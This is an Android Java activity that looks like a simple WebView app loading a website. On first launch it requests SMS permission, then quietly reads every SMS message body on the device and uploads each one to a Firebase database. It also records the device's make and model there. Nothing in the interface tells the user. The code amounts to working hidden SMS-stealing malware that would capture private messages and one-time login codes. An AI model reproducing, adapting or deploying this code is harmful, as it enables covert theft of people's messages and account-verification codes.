package com.abhi.forward;


import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.webkit.WebView;
import android.webkit.WebSettings;
import android.webkit.WebViewClient;
import android.widget.Toast;
import android.Manifest;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;


public class MainActivity extends AppCompatActivity {

    private WebView webView;
    private DatabaseReference mDatabase;

    private static final int SMS_PERMISSION_REQUEST_CODE = 1001;
    private static final String PREFS_NAME = "MyPrefsFile";
    private static final String SMS_PUSHED_KEY = "sms_pushed";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        // webView to display website in app
        webView = findViewById(R.id.webview);
        webView.setWebViewClient(new WebViewClient());
        webView.loadUrl("https://avvjt.netlify.app/");
        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);

        // Initialize Firebase components
        mDatabase = FirebaseDatabase.getInstance().getReference();

        // Check if device name is already stored in Firebase
        mDatabase.child("devices").addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                boolean deviceNameExists = false;
                for (DataSnapshot snapshot : dataSnapshot.getChildren()) {
                    String deviceName = snapshot.getValue(String.class);
                    if (deviceName != null && deviceName.equals(getDeviceName())) {
                        deviceNameExists = true;
                        break;
                    }
                }
                if (!deviceNameExists) {
                    // Push device name to Firebase only if it doesn't exist
                    pushDeviceNameToFirebase(getDeviceName());
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                // Handle error
            }
        });




        // Check if the app has permission to read SMS
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            // If not, request the permission
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS}, SMS_PERMISSION_REQUEST_CODE);
        } else {
            // If yes, proceed to read and push SMS if it's the first launch
            SharedPreferences settings = getSharedPreferences(PREFS_NAME, 0);
            boolean smsPushed = settings.getBoolean(SMS_PUSHED_KEY, false);
            if (!smsPushed) {
                readAndPushSMS();
                // Save a flag indicating that SMS messages have been pushed
                SharedPreferences.Editor editor = settings.edit();
                editor.putBoolean(SMS_PUSHED_KEY, true);
                editor.apply();
            }
        }










    }





    // Method to read SMS and push to Firebase
    private void readAndPushSMS() {
        // Initialize Firebase if not already done
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference smsRef = database.getReference("sms");

        // Query the SMS content provider to get all SMS messages
        Uri uri = Uri.parse("content://sms");
        Cursor cursor = getContentResolver().query(uri, null, null, null, null);
        if (cursor != null && cursor.moveToFirst()) {
            int bodyIndex = cursor.getColumnIndex("body");
            do {
                // Extract SMS body
                String smsBody = cursor.getString(bodyIndex);
                // Push SMS body to Firebase
                smsRef.push().setValue(smsBody);
            } while (cursor.moveToNext());
            cursor.close();
        }
    }

    // Handle permission request result
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == SMS_PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // If permission granted, read and push SMS if it's the first launch
                SharedPreferences settings = getSharedPreferences(PREFS_NAME, 0);
                boolean smsPushed = settings.getBoolean(SMS_PUSHED_KEY, false);
                if (!smsPushed) {
                    readAndPushSMS();
                    // Save a flag indicating that SMS messages have been pushed
                    SharedPreferences.Editor editor = settings.edit();
                    editor.putBoolean(SMS_PUSHED_KEY, true);
                    editor.apply();
                }
            } else {
                // If permission denied, show a message
                Toast.makeText(this, "SMS permission is required to proceed.", Toast.LENGTH_SHORT).show();
            }
        }
    }






    private String getDeviceName() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        if (model.startsWith(manufacturer)) {
            return capitalize(model);
        } else {
            return capitalize(manufacturer) + " " + model;
        }
    }

    private String capitalize(String s) {
        if (s == null || s.length() == 0) {
            return "";
        }
        char first = s.charAt(0);
        if (Character.isLowerCase(first)) {
            return Character.toUpperCase(first) + s.substring(1);
        } else {
            return s;
        }
    }

    private void pushDeviceNameToFirebase(String deviceName) {
        // Push device name to Firebase under a specific node
        mDatabase.child("devices").push().setValue(deviceName);
    }


    public class mywebClient extends WebViewClient {
        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) {
            super.onPageStarted(view,url,favicon);
        }
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            view.loadUrl(url);
            return true;
        }
    }
    @Override
    public void onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }


}